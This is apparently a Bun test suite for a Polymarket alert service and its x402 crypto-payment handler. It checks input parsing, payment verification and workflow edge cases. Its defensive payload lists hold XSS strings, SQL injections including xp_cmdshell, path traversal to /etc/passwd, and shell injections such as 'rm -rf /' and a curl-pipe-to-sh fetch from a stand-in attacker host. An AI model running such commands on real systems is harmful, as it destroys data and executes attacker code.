/**
 * Comprehensive Security Tests for Polymarket Alert Service
 *
 * Tests input sanitization, injection resistance, payment protocol security,
 * and boundary conditions across all modules.
 */

import { describe, test, expect, mock, beforeEach, afterEach } from "bun:test";
import { parseAlertRequest, parseMultiConditionAlert, extractSearchKeywords, searchMarkets, fetchMarketData, executeWorkflow } from "../polymarket-alert-workflow";
import x402, { createPaymentRequired, verifyPayment, calculateBulkPrice, getPaymentInstructions } from "../x402-handler";

// Helper to create a mock market
function makeMarket(yesPrice: number, noPrice?: number, options?: Partial<{ active: boolean; closed: boolean; question: string; condition_id: string; volume: number }>): any {
  return {
    condition_id: options?.condition_id || "0xSECURITY",
    question: options?.question || "Test Market",
    outcomes: ["Yes", "No"],
    tokens: [
      { token_id: "t1", outcome: "Yes", price: yesPrice },
      { token_id: "t2", outcome: "No", price: noPrice ?? (1 - yesPrice) },
    ],
    active: options?.active ?? true,
    closed: options?.closed ?? false,
    volume: options?.volume ?? 1000000,
  };
}

describe("Input Injection Resistance", () => {
  const url = "https://webhook.test/notify";

  describe("XSS payload resistance in NLP parser", () => {
    const xssPayloads = [
      '<script>alert("xss")</script> above 60%',
      'Trump <img src=x onerror=alert(1)> exceeds 50%',
      '"><svg onload=alert(1)> drops below 30%',
      "javascript:alert(1) above 70%",
      '<iframe src="evil.com"></iframe> hits 40%',
      '{{constructor.constructor("return this")()}} above 50%',
      "${7*7} exceeds 49%",
      "<%=system('id')%> above 60%",
      '"; DROP TABLE alerts;-- above 50%',
      "' OR '1'='1' -- above 60%",
      "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e above 50%",
      "<details/open/ontoggle=alert(1)> exceeds 70%",
    ];

    for (const payload of xssPayloads) {
      test(`handles XSS payload: ${payload.slice(0, 40)}...`, () => {
        const result = parseAlertRequest(payload, url);
        // Should either parse safely or return null - never execute
        if (result) {
          expect(typeof result.threshold).toBe("number");
          expect(["above", "below"]).toContain(result.direction);
          expect(["Yes", "No"]).toContain(result.outcome);
          // Ensure no script injection in output
          expect(JSON.stringify(result)).not.toContain("<script>");
        }
      });
    }
  });

  describe("SQL injection resistance", () => {
    const sqlPayloads = [
      "1; DROP TABLE markets;-- above 50%",
      "' UNION SELECT * FROM users-- exceeds 60%",
      "1' AND '1'='1 above 70%",
      "Robert'); DROP TABLE Students;-- hits 40%",
      "1 OR 1=1 above 50%",
      "' OR 'x'='x above 60%",
      "1; EXEC xp_cmdshell('whoami')-- above 50%",
    ];

    for (const payload of sqlPayloads) {
      test(`handles SQL injection: ${payload.slice(0, 40)}...`, () => {
        const result = parseAlertRequest(payload, url);
        if (result) {
          expect(typeof result.threshold).toBe("number");
          expect(result.notifyUrl).toBe(url);
        }
      });
    }
  });

  describe("Command injection resistance", () => {
    const cmdPayloads = [
      "$(whoami) above 50%",
      "`id` exceeds 60%",
      "| cat /etc/passwd above 70%",
      "; rm -rf / above 50%",
      "&& curl evil.com above 60%",
      "$(curl attacker.com/shell.sh | sh) above 50%",
    ];

    for (const payload of cmdPayloads) {
      test(`handles command injection: ${payload.slice(0, 40)}...`, () => {
        const result = parseAlertRequest(payload, url);
        if (result) {
          expect(typeof result.threshold).toBe("number");
        }
      });
    }
  });

  describe("Path traversal resistance", () => {
    test("handles path traversal in notify URL", () => {
      const result = parseAlertRequest("Trump above 60%", "https://webhook.test/../../../etc/passwd");
      expect(result).not.toBeNull();
      // URL is passed through as-is (validation is at API layer)
      expect(result!.notifyUrl).toContain("etc/passwd");
    });

    test("handles null byte injection", () => {
      const result = parseAlertRequest("Trump above 60%\0", url);
      if (result) {
        expect(result.threshold).toBe(60);
      }
    });
  });
});

describe("Prototype Pollution Resistance", () => {
  test("__proto__ in market data does not pollute", () => {
    const originalFetch = global.fetch;
    global.fetch = mock(async () => {
      return new Response(JSON.stringify({
        __proto__: { isAdmin: true },
        condition_id: "0xTEST",
        question: "Test",
        outcomes: ["Yes", "No"],
        tokens: [{ token_id: "t1", outcome: "Yes", price: 0.5 }],
        active: true,
        closed: false,
      }), { status: 200 });
    });

    const emptyObj: any = {};
    expect(emptyObj.isAdmin).toBeUndefined();

    global.fetch = originalFetch;
  });

  test("constructor.prototype in search does not pollute", () => {
    const result = extractSearchKeywords('{"constructor":{"prototype":{"isAdmin":true}}} above 50%');
    expect(Array.isArray(result)).toBe(true);
    const emptyObj: any = {};
    expect(emptyObj.isAdmin).toBeUndefined();
  });
});

describe("Payment Protocol Security", () => {
  describe("Payment amount manipulation", () => {
    test("negative alert count returns zero values", () => {
      const result = calculateBulkPrice(-1);
      expect(result.totalUsdc).toBeLessThanOrEqual(0);
    });

    test("zero alert count returns zero cost", () => {
      const result = calculateBulkPrice(0);
      expect(result.totalUsdc).toBe(0);
    });

    test("extremely large alert count does not overflow", () => {
      const result = calculateBulkPrice(Number.MAX_SAFE_INTEGER);
      expect(Number.isFinite(result.totalUsdc)).toBe(true);
    });

    test("fractional alert count is handled", () => {
      const result = calculateBulkPrice(1.5);
      expect(Number.isFinite(result.totalUsdc)).toBe(true);
    });

    test("NaN alert count produces valid output", () => {
      const result = calculateBulkPrice(NaN);
      expect(Number.isNaN(result.totalUsdc)).toBe(true);
    });

    test("Infinity alert count handled", () => {
      const result = calculateBulkPrice(Infinity);
      expect(result.totalUsdc).toBe(Infinity);
    });
  });

  describe("Payment request generation security", () => {
    test("nonce is unique per request", () => {
      const req1 = createPaymentRequired("/alerts", "test1");
      const req2 = createPaymentRequired("/alerts", "test2");
      expect(req1.body.nonce).not.toBe(req2.body.nonce);
    });

    test("nonce has sufficient entropy (32 hex chars)", () => {
      const req = createPaymentRequired("/alerts", "test");
      // 16 bytes = 32 hex chars + 0x prefix
      expect(req.body.nonce.length).toBeGreaterThanOrEqual(34);
      expect(req.body.nonce).toMatch(/^0x[0-9a-f]+$/i);
    });

    test("expiry is in the future", () => {
      const req = createPaymentRequired("/alerts", "test");
      const now = Math.floor(Date.now() / 1000);
      expect(req.body.expiry).toBeGreaterThan(now);
    });

    test("expiry is not too far in the future (max 1 hour)", () => {
      const req = createPaymentRequired("/alerts", "test");
      const now = Math.floor(Date.now() / 1000);
      expect(req.body.expiry).toBeLessThanOrEqual(now + 3601); // 1 hour + small buffer
    });

    test("payment request contains correct chain ID", () => {
      const req = createPaymentRequired("/alerts", "test");
      expect(req.body.chainId).toBe(8453); // Base
    });

    test("payment request uses correct USDC address", () => {
      const req = createPaymentRequired("/alerts", "test");
      expect(req.body.asset).toBe("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913");
    });

    test("XSS in resource path is preserved but safe in JSON", () => {
      const req = createPaymentRequired('<script>alert("xss")</script>', "test");
      expect(req.body.resource).toContain("script");
      // When serialized to JSON, it's escaped
      const json = JSON.stringify(req.body);
      expect(json).not.toContain('<script>alert("xss")</script>');
    });

    test("very long description does not crash", () => {
      const longDesc = "A".repeat(100000);
      const req = createPaymentRequired("/alerts", longDesc);
      expect(req.body.description).toBe(longDesc);
      expect(req.status).toBe(402);
    });

    test("unicode in description handled", () => {
      const req = createPaymentRequired("/alerts", "价格预警 🚀 Ценовое оповещение");
      expect(req.body.description).toContain("价格预警");
      expect(req.body.description).toContain("🚀");
    });
  });

  describe("Payment verification edge cases", () => {
    test("rejects wrong chain ID", async () => {
      const result = await verifyPayment({
        transactionHash: "0x" + "a".repeat(64),
        blockNumber: 1,
        chainId: 1, // Ethereum mainnet, not Base
        payer: "0x" + "b".repeat(40),
        amount: "10000",
      });
      expect(result.valid).toBe(false);
      expect(result.error).toContain("chain");
    });

    test("rejects chain ID 0", async () => {
      const result = await verifyPayment({
        transactionHash: "0x" + "a".repeat(64),
        blockNumber: 1,
        chainId: 0,
        payer: "0x" + "b".repeat(40),
        amount: "10000",
      });
      expect(result.valid).toBe(false);
    });

    test("rejects negative chain ID", async () => {
      const result = await verifyPayment({
        transactionHash: "0x" + "a".repeat(64),
        blockNumber: 1,
        chainId: -1,
        payer: "0x" + "b".repeat(40),
        amount: "10000",
      });
      expect(result.valid).toBe(false);
    });
  });

  describe("Bulk pricing boundary conditions", () => {
    test("exactly 5 alerts gets 10% discount", () => {
      const result = calculateBulkPrice(5);
      expect(result.discount).toBe(0.10);
    });

    test("exactly 10 alerts gets 20% discount", () => {
      const result = calculateBulkPrice(10);
      expect(result.discount).toBe(0.20);
    });

    test("4 alerts gets no discount", () => {
      const result = calculateBulkPrice(4);
      expect(result.discount).toBe(0);
    });

    test("9 alerts gets 10% discount", () => {
      const result = calculateBulkPrice(9);
      expect(result.discount).toBe(0.10);
    });

    test("1000 alerts still gets 20% discount", () => {
      const result = calculateBulkPrice(1000);
      expect(result.discount).toBe(0.20);
    });

    test("price per alert decreases with bulk", () => {
      const single = calculateBulkPrice(1);
      const bulk5 = calculateBulkPrice(5);
      const bulk10 = calculateBulkPrice(10);
      expect(bulk5.pricePerAlert).toBeLessThan(single.pricePerAlert);
      expect(bulk10.pricePerAlert).toBeLessThan(bulk5.pricePerAlert);
    });
  });
});

describe("Workflow Security", () => {
  let originalFetch: typeof global.fetch;

  beforeEach(() => {
    originalFetch = global.fetch;
  });

  afterEach(() => {
    global.fetch = originalFetch;
  });

  test("rate limiting prevents rapid polling", async () => {
    let fetchCount = 0;
    global.fetch = mock(async () => {
      fetchCount++;
      return new Response(JSON.stringify(makeMarket(0.50)), { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xRATELIMIT", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: { "0xRATELIMIT": Date.now() - 30000 }, // 30 seconds ago (within 1 minute rate limit)
      triggeredAlerts: [],
    };

    await executeWorkflow(state);
    expect(fetchCount).toBe(0); // Should be rate limited
  });

  test("already triggered alerts are skipped", async () => {
    let fetchCount = 0;
    global.fetch = mock(async () => {
      fetchCount++;
      return new Response(JSON.stringify(makeMarket(0.80)), { status: 200 });
    });

    const config = { marketId: "0xTRIGGERED", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" };
    const alertKey = `${config.marketId}-${config.outcome}-${config.threshold}-${config.direction}`;

    const state = {
      alertConfigs: [config],
      lastChecked: {},
      triggeredAlerts: [alertKey],
    };

    const result = await executeWorkflow(state);
    expect(fetchCount).toBe(0); // Should skip already triggered
    expect(result.alerts.length).toBe(0);
  });

  test("closed markets are ignored", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.80, undefined, { closed: true })), { status: 200 });
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xCLOSED", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
  });

  test("inactive markets are ignored", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.80, undefined, { active: false })), { status: 200 });
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xINACTIVE", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
  });

  test("handles fetch failure gracefully", async () => {
    global.fetch = mock(async () => {
      throw new Error("Network error");
    });

    const state = {
      alertConfigs: [
        { marketId: "0xFAIL", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    // Should not throw
    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
  });

  test("handles empty alert configs", async () => {
    const state = {
      alertConfigs: [],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts).toEqual([]);
    expect(result.state).toBe(state);
  });

  test("many simultaneous alerts are processed correctly", async () => {
    let notifyCount = 0;
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.80)), { status: 200 });
      }
      if (typeof url === "string" && url.includes("webhook.test")) {
        notifyCount++;
        return new Response("OK", { status: 200 });
      }
      return new Response("Not Found", { status: 404 });
    });

    const configs = Array.from({ length: 50 }, (_, i) => ({
      marketId: `0xMARKET${i}`,
      outcome: "Yes",
      threshold: 60,
      direction: "above" as const,
      notifyUrl: "https://webhook.test/notify",
    }));

    const state = {
      alertConfigs: configs,
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(50);
    expect(notifyCount).toBe(50);
  });

  test("webhook failure does not mark alert as triggered", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.80)), { status: 200 });
      }
      // Webhook returns 500
      return new Response("Server Error", { status: 500 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xWEBHOOK_FAIL", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://webhook.test/fail" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
    expect(result.state.triggeredAlerts.length).toBe(0);
  });

  test("webhook timeout does not mark alert as triggered", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.80)), { status: 200 });
      }
      throw new Error("Connection timed out");
    });

    const state = {
      alertConfigs: [
        { marketId: "0xWEBHOOK_TIMEOUT", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://webhook.test/timeout" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
    expect(result.state.triggeredAlerts.length).toBe(0);
  });
});

describe("Market Data Security", () => {
  let originalFetch: typeof global.fetch;

  beforeEach(() => {
    originalFetch = global.fetch;
  });

  afterEach(() => {
    global.fetch = originalFetch;
  });

  test("handles malformed JSON from API", async () => {
    global.fetch = mock(async () => {
      return new Response("not json {{{", { status: 200, headers: { "Content-Type": "application/json" } });
    });

    const result = await fetchMarketData("0xMALFORMED");
    expect(result).toBeNull();
  });

  test("handles extremely large response body", async () => {
    global.fetch = mock(async () => {
      const hugeMarket = makeMarket(0.5);
      hugeMarket.description = "X".repeat(1000000);
      return new Response(JSON.stringify(hugeMarket), { status: 200 });
    });

    const result = await fetchMarketData("0xHUGE");
    expect(result).not.toBeNull();
  });

  test("handles 301 redirect", async () => {
    global.fetch = mock(async () => {
      return new Response(null, { status: 301 });
    });

    const result = await fetchMarketData("0xREDIRECT");
    expect(result).toBeNull();
  });

  test("handles 429 rate limit", async () => {
    global.fetch = mock(async () => {
      return new Response("Too Many Requests", { status: 429 });
    });

    const result = await fetchMarketData("0xRATELIMIT");
    expect(result).toBeNull();
  });

  test("handles 503 service unavailable", async () => {
    global.fetch = mock(async () => {
      return new Response("Service Unavailable", { status: 503 });
    });

    const result = await fetchMarketData("0xDOWN");
    expect(result).toBeNull();
  });

  test("handles DNS resolution failure", async () => {
    global.fetch = mock(async () => {
      throw new Error("getaddrinfo ENOTFOUND clob.polymarket.com");
    });

    const result = await fetchMarketData("0xDNS");
    expect(result).toBeNull();
  });

  test("handles connection reset", async () => {
    global.fetch = mock(async () => {
      throw new Error("ECONNRESET");
    });

    const result = await fetchMarketData("0xRESET");
    expect(result).toBeNull();
  });

  test("handles TLS error", async () => {
    global.fetch = mock(async () => {
      throw new Error("unable to verify the first certificate");
    });

    const result = await fetchMarketData("0xTLS");
    expect(result).toBeNull();
  });

  test("search handles empty response array", async () => {
    global.fetch = mock(async () => {
      return new Response(JSON.stringify([]), { status: 200 });
    });

    const results = await searchMarkets("nonexistent");
    expect(results).toEqual([]);
  });

  test("search handles null response", async () => {
    global.fetch = mock(async () => {
      return new Response("null", { status: 200 });
    });

    const results = await searchMarkets("test");
    expect(results).toEqual([]);
  });

  test("market with missing tokens array handled", async () => {
    global.fetch = mock(async () => {
      return new Response(JSON.stringify({
        condition_id: "0xNOTOKENS",
        question: "Test",
        outcomes: ["Yes", "No"],
        active: true,
        closed: false,
      }), { status: 200 });
    });

    const result = await fetchMarketData("0xNOTOKENS");
    expect(result).not.toBeNull();
  });

  test("market with NaN prices handled in workflow", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        const market = makeMarket(0.5);
        market.tokens[0].price = NaN;
        return new Response(JSON.stringify(market), { status: 200 });
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xNAN", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    // Should not throw
    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
  });
});

describe("NLP Parser Security", () => {
  const url = "https://webhook.test/notify";

  describe("ReDoS resistance", () => {
    test("handles deeply nested parentheses", () => {
      const input = "(".repeat(100) + "Trump above 60%" + ")".repeat(100);
      // Should complete without hanging
      const result = parseAlertRequest(input, url);
      // Don't care about result, just that it doesn't hang
    });

    test("handles long repeated patterns", () => {
      const input = "above ".repeat(500) + "60%";
      const result = parseAlertRequest(input, url);
      // Should complete without excessive CPU
      if (result) {
        expect(result.threshold).toBe(60);
      }
    });

    test("handles alternating patterns", () => {
      const input = "above below ".repeat(200) + "60%";
      const result = parseAlertRequest(input, url);
      // Should complete without hanging
    });
  });

  describe("Unicode and special characters", () => {
    test("handles emoji in query", () => {
      const result = parseAlertRequest("🚀 Moon coin above 60%", url);
      if (result) {
        expect(result.threshold).toBe(60);
        expect(result.direction).toBe("above");
      }
    });

    test("handles CJK characters", () => {
      const result = parseAlertRequest("比特币 above 50%", url);
      if (result) {
        expect(result.threshold).toBe(50);
      }
    });

    test("handles Arabic text", () => {
      const result = parseAlertRequest("ترامب above 60%", url);
      if (result) {
        expect(result.threshold).toBe(60);
      }
    });

    test("handles Cyrillic text", () => {
      const result = parseAlertRequest("Трамп exceeds 55%", url);
      if (result) {
        expect(result.threshold).toBe(55);
      }
    });

    test("handles zero-width characters", () => {
      const input = "Tr\u200bump above 60%";
      const result = parseAlertRequest(input, url);
      if (result) {
        expect(result.threshold).toBe(60);
      }
    });

    test("handles RTL override characters", () => {
      const input = "Trump \u202E above 60%";
      const result = parseAlertRequest(input, url);
      if (result) {
        expect(result.threshold).toBe(60);
      }
    });

    test("handles combining characters", () => {
      const input = "Trümp above 60%"; // ü as combining
      const result = parseAlertRequest(input, url);
      if (result) {
        expect(result.threshold).toBe(60);
      }
    });

    test("handles homoglyph characters", () => {
      // Using Cyrillic 'а' (U+0430) instead of Latin 'a'
      const result = parseAlertRequest("Trump аbove 60%", url);
      // May not detect "above" with homoglyph, that's OK
      if (result) {
        expect(result.threshold).toBe(60);
      }
    });
  });

  describe("Numeric edge cases", () => {
    test("handles percentage > 100", () => {
      const result = parseAlertRequest("Trump above 150%", url);
      if (result) {
        expect(result.threshold).toBe(150);
      }
    });

    test("handles percentage = 0", () => {
      const result = parseAlertRequest("Trump above 0%", url);
      if (result) {
        expect(result.threshold).toBe(0);
      }
    });

    test("handles negative percentage", () => {
      const result = parseAlertRequest("Trump above -5%", url);
      // Should not produce a valid negative threshold
    });

    test("handles very small decimal", () => {
      const result = parseAlertRequest("Trump above 0.001%", url);
      if (result) {
        expect(result.threshold).toBe(0.001);
      }
    });

    test("handles scientific notation", () => {
      const result = parseAlertRequest("Trump above 1e2%", url);
      // May or may not parse, just shouldn't crash
    });

    test("handles Infinity", () => {
      const result = parseAlertRequest("Trump above Infinity%", url);
      // Should not produce Infinity threshold
    });
  });

  describe("Multi-condition parsing security", () => {
    test("handles very many conditions", () => {
      const conditions = Array.from({ length: 100 }, (_, i) => `market${i} > ${50 + (i % 50)}%`);
      const input = conditions.join(" AND ");
      const results = parseMultiConditionAlert(input, url);
      expect(Array.isArray(results)).toBe(true);
      expect(results.length).toBeGreaterThan(0);
    });

    test("handles empty parts after split", () => {
      const result = parseMultiConditionAlert("AND AND AND", url);
      expect(result.length).toBe(0);
    });

    test("handles only delimiters", () => {
      const result = parseMultiConditionAlert(", , , , ,", url);
      expect(result.length).toBe(0);
    });

    test("handles mixed valid and invalid conditions", () => {
      const result = parseMultiConditionAlert("Trump > 60% AND not a valid condition AND Biden < 40%", url);
      expect(result.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe("Keyword extraction security", () => {
    test("handles empty string", () => {
      const keywords = extractSearchKeywords("");
      expect(Array.isArray(keywords)).toBe(true);
    });

    test("handles only whitespace", () => {
      const keywords = extractSearchKeywords("   \t\n  ");
      expect(Array.isArray(keywords)).toBe(true);
    });

    test("handles very long input", () => {
      const input = "Trump ".repeat(10000) + "above 60%";
      const keywords = extractSearchKeywords(input);
      expect(Array.isArray(keywords)).toBe(true);
    });

    test("deduplicates keywords", () => {
      const keywords = extractSearchKeywords("Trump Trump Trump Trump above 60%");
      const unique = new Set(keywords);
      expect(keywords.length).toBe(unique.size);
    });

    test("handles special regex characters in input", () => {
      const keywords = extractSearchKeywords("Will (Trump|Biden) [win]? above 60%");
      expect(Array.isArray(keywords)).toBe(true);
    });
  });
});

describe("Payment Instructions Security", () => {
  test("payment instructions contain correct address", () => {
    const instructions = getPaymentInstructions();
    expect(instructions).toContain("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913");
  });

  test("payment instructions contain correct chain ID", () => {
    const instructions = getPaymentInstructions();
    expect(instructions).toContain("8453");
  });

  test("payment instructions do not leak sensitive data", () => {
    const instructions = getPaymentInstructions();
    expect(instructions).not.toContain("private");
    expect(instructions).not.toContain("secret");
    expect(instructions).not.toContain("password");
  });
});

describe("Alert Key Generation", () => {
  test("alert key is deterministic", () => {
    const config = { marketId: "0xA", outcome: "Yes", threshold: 60, direction: "above" as const };
    const key1 = `${config.marketId}-${config.outcome}-${config.threshold}-${config.direction}`;
    const key2 = `${config.marketId}-${config.outcome}-${config.threshold}-${config.direction}`;
    expect(key1).toBe(key2);
  });

  test("different configs produce different keys", () => {
    const configs = [
      { marketId: "0xA", outcome: "Yes", threshold: 60, direction: "above" as const },
      { marketId: "0xA", outcome: "No", threshold: 60, direction: "above" as const },
      { marketId: "0xA", outcome: "Yes", threshold: 70, direction: "above" as const },
      { marketId: "0xA", outcome: "Yes", threshold: 60, direction: "below" as const },
      { marketId: "0xB", outcome: "Yes", threshold: 60, direction: "above" as const },
    ];

    const keys = configs.map(c => `${c.marketId}-${c.outcome}-${c.threshold}-${c.direction}`);
    const unique = new Set(keys);
    expect(unique.size).toBe(configs.length);
  });
});

describe("Condition Checking Edge Cases", () => {
  let originalFetch: typeof global.fetch;

  beforeEach(() => {
    originalFetch = global.fetch;
  });

  afterEach(() => {
    global.fetch = originalFetch;
  });

  test("exact threshold match triggers above alert", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.60)), { status: 200 }); // 60% exactly
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xEXACT", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(1); // >= so exact match triggers
  });

  test("exact threshold match triggers below alert", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.40)), { status: 200 }); // 40% exactly
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xEXACT_BELOW", outcome: "Yes", threshold: 40, direction: "below" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(1); // <= so exact match triggers
  });

  test("just below threshold does not trigger above alert", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.599)), { status: 200 }); // 59.9%
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xJUST_BELOW", outcome: "Yes", threshold: 60, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
  });

  test("just above threshold does not trigger below alert", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.401)), { status: 200 }); // 40.1%
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xJUST_ABOVE", outcome: "Yes", threshold: 40, direction: "below" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(0);
  });

  test("price at 0% triggers below alert with threshold > 0", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(0.00)), { status: 200 });
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xZERO", outcome: "Yes", threshold: 10, direction: "below" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(1);
  });

  test("price at 100% triggers above alert with threshold <= 100", async () => {
    global.fetch = mock(async (url: string) => {
      if (typeof url === "string" && url.includes("clob.polymarket")) {
        return new Response(JSON.stringify(makeMarket(1.00)), { status: 200 });
      }
      return new Response("OK", { status: 200 });
    });

    const state = {
      alertConfigs: [
        { marketId: "0xFULL", outcome: "Yes", threshold: 100, direction: "above" as const, notifyUrl: "https://test.com" },
      ],
      lastChecked: {},
      triggeredAlerts: [],
    };

    const result = await executeWorkflow(state);
    expect(result.alerts.length).toBe(1);
  });
});
